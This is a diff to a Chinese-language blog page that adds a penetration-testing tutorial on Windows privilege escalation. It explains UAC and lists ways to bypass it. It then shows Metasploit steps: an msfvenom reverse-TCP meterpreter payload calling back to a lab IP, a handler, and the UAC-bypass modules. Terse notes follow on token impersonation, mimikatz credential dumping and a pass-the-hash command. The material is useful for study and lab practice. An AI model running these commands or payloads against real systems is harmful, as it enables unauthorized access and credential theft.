@@ -5,7 +5,7 @@
 <head>
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
     <meta name="keywords" content="内网渗透专题（三）, HTML,CSS,JavaScript,JQuery,java,linux等">
-    <meta name="description" content="内网渗透比较系统的讲解">
+    <meta name="description" content="内网渗透权限提升">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -454,21 +454,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-04-16
+                    2022-04-22
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    759
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -486,7 +486,101 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h2 id="UAC提权"><a href="#UAC提权" class="headerlink" title="UAC提权"></a>UAC提权</h2><h4 id="UAC简介："><a href="#UAC简介：" class="headerlink" title="UAC简介："></a>UAC简介：</h4><p><strong>UAC</strong>(User Account Control）简称<strong>用户帐户控制</strong>，UAC 是Windows Vista以上的版本中引入了要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员‌密码。</p>
+<h4 id="UAC工作模式"><a href="#UAC工作模式" class="headerlink" title="UAC工作模式"></a><strong>UAC工作模式</strong></h4><img src="image-20220418235814086.png" style="zoom: 33%;">
+
+
+
+<p>需要UAC的授权才能进行的操作：</p>
+<blockquote>
+<p>配置Windows Update</p>
+<p>增加、删除账户；更改账户类型</p>
+<p>更改UAC的设置</p>
+<p>安装ActiveX；安装、卸载程序</p>
+<p>安装设备驱动程序</p>
+<p>将文件移动/复制到ProgramFiles或Windows目录下</p>
+<p>查看其它用户的文件夹</p>
+</blockquote>
+<p>UAC有如下四种设置要求：</p>
+<blockquote>
+<p>始终通知：这是最严格的设置，每当有程序需要使用高级别的权限时都会提示本地用户</p>
+<p>仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。当本地Windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别的权限时，会提示本地用户</p>
+<p>仅在程序试图更改我的计算机时通知我(不降低桌面的亮度)：与上一条设置的要求相同，但在提示用户时不降低桌面的亮度</p>
+<p>从不提示：当用户为系统管理员时，所有程序都会以最高权限运行</p>
+</blockquote>
+<img src="1612334525_601a45bd42f4b0d66d0d8.png" style="zoom:50%;">
+
+
+
+<h4 id="绕过UAC的几种思路"><a href="#绕过UAC的几种思路" class="headerlink" title="绕过UAC的几种思路"></a><strong>绕过UAC的几种思路</strong></h4><p>目前公开的方法中，有以下几种绕过UAC思路：</p>
+<blockquote>
+<p>白名单劫持（利用白名单程序是该程序以系统权限启动且不用通知用户，只要我们找到相关程序劫持它，此时只要程序启动，也会带着我们的程序以系统权限启动。）</p>
+<p>DLL 劫持</p>
+<p>Windows 自身漏洞提权</p>
+<p>远程注入</p>
+<p>COM 接口技术</p>
+</blockquote>
+<h4 id="msf过UAC演示"><a href="#msf过UAC演示" class="headerlink" title="msf过UAC演示"></a>msf过UAC演示</h4><ol>
+<li><p>生成木马    </p>
+<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.221.132 lport=4444 -f exe &gt;shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>连接木马</p>
+<p>打开msf</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/handler    <span class="token comment">#设置监听</span>
+<span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp    <span class="token comment">#设置payload</span>
+<span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.221.132
+<span class="token builtin class-name">set</span> lport <span class="token number">4444</span>
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>目标机打开shell.exe</p>
+<img src="image-20220420125150799.png">
+</li>
+<li><p>查看身份</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">getuid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ol>
+<p><img src="/2022/04/15/nei-wang-shen-tou-zhuan-ti-san/image-20220420125403414.png"></p>
+<ol start="4">
+<li><p>meterpreter放置后台,UAC提权</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">background<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/windows/local/ask<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/04/15/nei-wang-shen-tou-zhuan-ti-san/image-20220420125804053.png"></p>
+</li>
+<li><p>配置信息</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="image-20220420125841674.png" style="zoom: 67%;">
+
+<p>通过上面，我们知道要设置一下session，再run</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> seesion <span class="token number">1</span>
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/2022/04/15/nei-wang-shen-tou-zhuan-ti-san/image-20220420131013993.png"></p>
+</li>
+<li><p>再次提权，提权成功</p>
+<p><img src="/2022/04/15/nei-wang-shen-tou-zhuan-ti-san/image-20220420131042902.png"></p>
+</li>
+</ol>
+<p>msf用<code>exploit/windows/local/bypassuac</code>同理，设置session，然后run一下，但是如果你的权限够高，他就不会给你提提权（比如你当前的权限是administrator，system等）</p>
+<p>会有以下报错</p>
+<p><img src="/2022/04/15/nei-wang-shen-tou-zhuan-ti-san/image-20220420131753036.png"></p>
+<h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><p>什么是令牌？</p>
+<p>临时秘钥，如U盾</p>
+<p>伪造令牌：kerberos协议</p>
+<p>msf：<code>list_token_u</code>权限越高，令牌越多</p>
+<p>msf假冒令牌</p>
+<h2 id="纵向，横向移动"><a href="#纵向，横向移动" class="headerlink" title="纵向，横向移动"></a>纵向，横向移动</h2><p><code>migrate 1880</code>：进程迁移</p>
+<p>use incognito</p>
+<p>c$，ipc$</p>
+<h2 id="mimikatz使用"><a href="#mimikatz使用" class="headerlink" title="mimikatz使用"></a>mimikatz使用</h2><p>至少是administrator权限使用</p>
+<p>域环境中，用户信息ntds.dit，加密后为散列值</p>
+<p>LM Hash NTLM Hash</p>
+<p>hash结构：user1:RID:LM-Hash:NT-Hash</p>
+<p>NTLM Hash基于md4加密算法</p>
+<p><code>"privilege::debug" "log" "sekurlsa::logonpassword"</code></p>
+<h2 id="pass-the-hash"><a href="#pass-the-hash" class="headerlink" title="pass-the-hash"></a>pass-the-hash</h2><p><code>mimikatz "privilege::debug" "sekurlsa::pth /user:xxx /domain:test1.com /aes256: xxxxx" </code></p>
+<h2 id="票据"><a href="#票据" class="headerlink" title="票据"></a>票据</h2>
                 
             </div>
             <hr/>
@@ -1007,7 +1101,7 @@
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            内网渗透比较系统的讲解
+                            内网渗透信息收集
                         
                     </div>
                     <div class="publish-info">
